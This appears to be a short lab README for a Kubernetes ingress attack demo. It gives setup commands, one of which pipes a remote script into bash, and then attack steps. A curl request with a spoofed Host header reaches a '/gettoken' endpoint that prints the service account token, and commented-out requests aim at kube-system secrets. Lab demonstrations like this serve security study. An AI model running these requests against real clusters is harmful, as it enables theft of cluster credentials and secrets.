# Setup

```bash
bash <(curl -fsSL https://k8s.adriansoftware.de/metallb.sh)
helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
helm repo update
helm upgrade --install ingress-nginx ingress-nginx/ingress-nginx --version 4.7.1
kubectl apply -f https://k8s.adriansoftware.de/attacks/02/setup.yaml
```

# Attack

from host

```bash
sudo ip route add 192.168.101.0/24 via 192.168.122.216

curl -H "Host: evil.domain" http://192.168.101.1/gettoken
# prints the kubernetes service account token
```

Change url ingress as required !!! .0 or .1

## Normal behavior

```bash
curl -H "Host: foo.bar" http://192.168.101.1 # prints 404
```

<!-- curl -H "Host: kubernetes.api" http://192.168.101.1/api/v1/namespaces/kube-system/secrets/ -->
<!-- curl -H "Host: evil.domain" http://127.0.0.1:8080/gettoken  -->
